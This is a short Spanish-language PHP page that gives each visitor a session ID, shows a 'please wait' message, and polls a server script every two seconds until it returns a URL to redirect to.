&lt;?php
session_start();
if (!isset($_SESSION['usuario_id'])) {
    $_SESSION['usuario_id'] = uniqid();
}
$usuario_id = $_SESSION['usuario_id'];
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Espere un momento&lt;/title&gt;
    &lt;script&gt;
    function checkRedirect() {
        fetch('check_destino.php?id=&lt;?php echo $usuario_id; ?&gt;')
        .then(response =&gt; response.json())
        .then(data =&gt; {
            if(data.destino){
                window.location.href = data.destino;
            } else {
                setTimeout(checkRedirect, 2000);
            }
        });
    }
    window.onload = checkRedirect;
    &lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
    <h2>Por favor espere...</h2>
    <p>Tu ID: <b>&lt;?php echo $usuario_id; ?&gt;</b></p>
&lt;/body&gt;
&lt;/html&gt;